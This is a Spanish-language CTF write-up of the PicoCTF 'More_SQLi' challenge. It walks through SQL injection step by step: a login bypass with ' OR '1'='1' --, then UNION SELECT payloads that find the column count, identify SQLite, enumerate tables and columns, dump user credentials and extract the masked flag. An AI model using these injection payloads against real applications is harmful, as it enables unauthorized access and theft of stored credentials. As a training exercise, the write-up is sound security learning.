# Writeup: More_SQLi
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Writeup: More_SQLi - PicoCTF - Inyección SQL en login y en el campo de busqueda (campo password)

Descripción del reto


Nos encontramos ante un formulario de login sin opción de registro. Al enviar credenciales, la aplicación muestra una consulta SQL que parece mal formada, indicando una posible vulnerabilidad de inyección SQL. El objetivo es obtener la flag.

Reconocimiento inicial


Probamos con un usuario cualquiera (kr3s4l4) y contraseña (pass). La página nos muestra:

text


SQL query: SELECT id FROM users WHERE password = 'pass' AND username = 'kr3s4l4 ' version@@ --'


Esto indica que la aplicación está construyendo dinámicamente la consulta y mostrando el error. Observamos un intento previo de inyección (version@@) que causa error de sintaxis. Dedujimos que la vulnerabilidad está en el campo password (aunque también podría estar en username).

Paso 1: Bypass básico del login


Intentamos saltarnos la autenticación usando una inyección clásica en **password**:


```
    Username: admin (o cualquier existente)

    Password: ' OR '1'='1' --

```

La consulta resultante:

sql


SELECT id FROM users WHERE password = '' OR '1'='1' -- ' AND username = 'admin'


El -- comenta el resto, y '1'='1' siempre es verdadero. Esto nos loguea como admin, pero en nuestro caso no mostró la flag directamente; solo un mensaje de éxito o redirección sin información útil.

Paso 2: Identificar el motor de base de datos


Pasamos el login y aparecemos en una pagina con un campo de busqueda que tambien es vulnerable a sqli asi que decidimos extraer información mediante inyección UNION. Primero necesitamos saber cuántas columnas selecciona la consulta original.


Probamos varios payloads de UNION con diferente número de columnas en el campo password (username dejamos kr3s4l4 para mantener la sintaxis correcta).

Notamos que con una columna daba error. Probamos con tres columnas que visualmente son las que aparecen:


**Payload**:

text


## ' union select 1,2,3 --


La página mostró:

text


City    Address    Phone

1       2          3


Confirmamos que la consulta original selecciona 3 columnas. Así que debemos usar siempre UNION SELECT 1,2, ... para igualar.

Paso 3: Obtener la versión y el motor


Para saber qué DBMS estamos usando, probamos funciones típicas:


```
    MySQL: @@version

    SQLite: sqlite_version()

    PostgreSQL: version()

```

**Payload**:

text


' UNION SELECT 1,2,sqlite_version() --


Resultado:

text


City    Address    Phone

1       2          3.31.1


Confirmamos: SQLite 3.31.1.

Paso 4: Enumerar tablas


En SQLite, las tablas se almacenan en sqlite_master. Usamos:


**Payload**:

text


' UNION SELECT 1,2,name FROM sqlite_master WHERE type='table' --


Resultado:

text


City    Address    Phone

1       2          hints

1       2          more_table

1       2          offices

1       2          users


Encontramos cuatro tablas. offices y users parecen propias de la aplicación; hints y more_table podrían contener la flag.

Paso 5: Inspeccionar la tabla users


Para ver si hay credenciales útiles o pistas, listamos sus columnas. En SQLite podemos usar pragma_table_info:


**Payload**:

text


' UNION SELECT 1,2,name FROM pragma_table_info('users') --


Resultado:

text


City    Address    Phone

1       2          id

1       2          name

1       2          password


Extraemos los datos concatenando name y **password**:


**Payload**:

text


' UNION SELECT 1,2, name || ':' || password FROM users --


Resultado:

text


City    Address    Phone

1       2          admin:moreRandOMN3ss


Obtenemos la credencial admin:moreRandOMN3ss. Aunque no es la flag, confirma que admin existe y podemos usarla para un login normal si fuera necesario.

Paso 6: Inspeccionar la tabla hints


Vemos sus columnas:


**Payload**:

text


' UNION SELECT 1,2,name FROM pragma_table_info('hints') --


Resultado:

text


City    Address    Phone

1       2          id

1       2          info


Extraemos el contenido de info:


**Payload**:

text


' UNION SELECT 1,2,info FROM hints --


Resultado:

text


City    Address    Phone

1       2          If you are here, you must have seen it


Solo una pista, no la flag.

Paso 7: Inspeccionar la tabla more_table


Vemos sus columnas:


**Payload**:

text


' UNION SELECT 1,2,name FROM pragma_table_info('more_table') --


Resultado:

text


City    Address    Phone

1       2          flag

1       2          id


¡Bingo! La columna flag debe contener la flag.


Extraemos el valor:


**Payload**:

text


' UNION SELECT 1,2,flag FROM more_table --


Resultado:

text


City    Address    Phone

1       2          picoCTF{****************************}


Y también aparece la línea If you are here... de la tabla hints en otra fila (mostrada previamente). La flag obtenida es la correcta.

Resumen de inconvenientes y soluciones


```
    Error de sintaxis inicial → El intento de inyección previo (version@@) nos dio la pista de que el campo era vulnerable.

    Suposición de una columna → Al ver SELECT id pensamos que la consulta original tenía una columna. Pero los intentos de UNION fallaron. Probamos con 2, 3 columnas y con 1,2,3 vimos la salida (las columnas City, Address, Phone). Aprendimos a usar 1,2,3 como test.

    Identificar DBMS → Probamos varias funciones hasta que sqlite_version() funcionó, indicando SQLite.

    Enumerar tablas en SQLite → Usamos sqlite_master en lugar de information_schema.

    Ver columnas → pragma_table_info es específico de SQLite y funcionó perfectamente.

    Concatenar resultados → Para volcar users usamos || para unir nombre y contraseña.

```

Comandos exactos utilizados (en orden)


Todos se introdujeron en el campo password, con username kr3s4l4 (o admin):


```
    ' UNION SELECT 1,2,3 -- (test de columnas)

    ' UNION SELECT 1,2,sqlite_version() -- (identificar SQLite)

    ' UNION SELECT 1,2,name FROM sqlite_master WHERE type='table' -- (listar tablas)

    ' UNION SELECT 1,2,name FROM pragma_table_info('users') -- (columnas de users)

    ' UNION SELECT 1,2, name || ':' || password FROM users -- (extraer credenciales)

    ' UNION SELECT 1,2,name FROM pragma_table_info('hints') -- (columnas de hints)

    ' UNION SELECT 1,2,info FROM hints -- (datos de hints)

    ' UNION SELECT 1,2,name FROM pragma_table_info('more_table') -- (columnas de more_table)

    ' UNION SELECT 1,2,flag FROM more_table -- (obtener la flag)

```

### Flag final


picoCTF{*******************************}

Lecciones aprendidas


```
    Siempre probar el número de columnas con ORDER BY o UNION SELECT 1,2,3....

    Identificar el DBMS es clave para usar el diccionario de tablas correcto (SQLite: sqlite_master, MySQL: information_schema).

    Usar pragma_table_info en SQLite para listar columnas es muy práctico.

    No rendirse ante errores; ajustar la sintaxis y el número de columnas hasta que funcione.
```

